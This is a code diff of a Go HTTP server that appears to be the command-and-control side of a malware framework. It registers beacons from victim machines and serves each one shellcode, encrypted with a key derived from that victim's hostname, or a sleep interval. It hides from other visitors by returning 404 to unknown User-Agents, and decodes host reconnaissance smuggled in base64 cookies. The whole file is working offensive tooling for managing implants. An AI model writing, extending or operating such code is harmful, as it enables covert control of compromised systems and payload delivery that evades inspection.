@@ -11,15 +11,24 @@ import (
 	"strings"
 )
 
+type Kitten struct {
+	Target     string
+	Shellcode  []byte
+	Id         int
+	InitChecks util.InitChecks
+}
+
 var (
-	Target []string
-	misc   util.InitChecks
-	userA  string
-	m      map[string][]byte
+	userA string
+	M     map[string]*Kitten
 )
 
 func CreateHttpServer(conf config.General) {
-	m = map[string][]byte{"all targets": []byte(fmt.Sprintf("%d", conf.GetSleep()))}
+	M = map[string]*Kitten{"all targets": {
+		Target:    "all targets",
+		Shellcode: []byte(fmt.Sprintf("%d", conf.GetSleep())),
+		Id:        len(M),
+	}}
 	address := fmt.Sprintf("%s:%d", conf.GetHost(), conf.GetPort())
 	userA = conf.GetUserAgent()
 	fmt.Printf("%s %s\n\n", color.Green("[+] Started http server on"), color.Yellow(address))
@@ -31,15 +40,15 @@ func CreateHttpServer(conf config.General) {
 	}
 }
 
-// HostShellcode Hosts the shellcode
+// HostShellcode Hosts the Shellcode
 func HostShellcode(path string, ip string) error {
 	var err error
-	if misc.Hostname == "" {
+	if M[ip].InitChecks.Hostname == "" {
 		return errors.New("wait for the implant to call back")
 	}
-	key := util.GenerateKey(misc.Hostname, 32)
+	key := util.GenerateKey(M[ip].InitChecks.Hostname, 32)
 	shellcode, err := util.ScToAES(path, key)
-	m[ip] = shellcode
+	M[ip].Shellcode = shellcode
 	fmt.Println(color.Green("[+] Shellcode hosted for " + ip))
 	if err != nil {
 		return err
@@ -48,40 +57,44 @@ func HostShellcode(path string, ip string) error {
 }
 
 func HostSleep(t int, ip string) {
-	m[ip] = []byte(fmt.Sprintf("%d", t))
+	M[ip].Shellcode = []byte(fmt.Sprintf("%d", t))
 	fmt.Printf("%s %d%s %s%s\n", color.Green("[+] Sleep time set to"), color.Yellow(t), color.Yellow("s"), color.Green("on "), color.Yellow(ip))
 }
 
 // Logs the requests from the beacons
 func logRequest(w http.ResponseWriter, r *http.Request) {
 	userAgent := r.UserAgent()
+	//check user agent
 	if userAgent != userA {
 		w.WriteHeader(404)
 		fmt.Printf("\n%s\n", color.Yellow("[!] Unauthorized user agent: "+userAgent))
 		return
 	}
 	addr := strings.Split(r.RemoteAddr, ":")
-	if len(m) == 1 {
-		_, err := w.Write(m["all targets"])
+	//Check if the beacon is already in the map
+	if _, ok := M[addr[0]]; ok {
+		_, err := w.Write(M[addr[0]].Shellcode)
 		if err != nil {
 			return
 		}
-	} else {
-		_, err := w.Write(m[addr[0]])
-		if err != nil {
-			return
-		}
-	}
-	if util.Contains(Target, addr[0]) {
 		return
 	} else {
-		Target = append(Target, addr[0])
+		M[addr[0]] = &Kitten{
+			Target:    addr[0],
+			Id:        len(M),
+			Shellcode: M["all targets"].Shellcode, //Set the shellcode to the default sleep time
+		}
+		_, err := w.Write(M[addr[0]].Shellcode)
+		if err != nil {
+			return
+		}
 		fmt.Printf("\n%s %s\n", color.Green("[+] Request from:"), color.Yellow(addr[0]))
 		fmt.Printf("%s %s\n", color.Green("[+] User-Agent:"), color.Yellow(r.UserAgent()))
+		//Get recon data
 		cookie := r.Header.Get("Cookie")
 		if cookie != "" {
 			out, err := b64.StdEncoding.DecodeString(cookie)
-			misc = util.UnmarshalJSON(out)
+			M[addr[0]].InitChecks = util.UnmarshalJSON(out)
 			if err != nil {
 				fmt.Println(color.Red("[!] Error decoding cookie"))
 			}
